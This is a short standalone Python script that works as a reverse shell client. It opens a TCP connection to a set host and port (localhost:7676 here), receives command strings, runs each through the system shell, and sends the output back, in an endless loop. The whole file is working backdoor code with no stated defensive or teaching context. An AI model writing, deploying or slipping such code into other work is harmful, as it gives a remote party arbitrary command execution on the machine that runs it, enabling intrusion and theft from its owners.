import socket
import subprocess
import sys
import time

def connect_to_server(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, port))
        while True:
            command = sock.recv(1024).decode('utf-8')
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = result.stdout.decode(sys.getfilesystemencoding())
            sock.send(output.encode('utf-8'))
            time.sleep(1)

if __name__ == "__main__":
    HOST, PORT = "127.0.0.1", 7676
    connect_to_server(HOST, PORT)
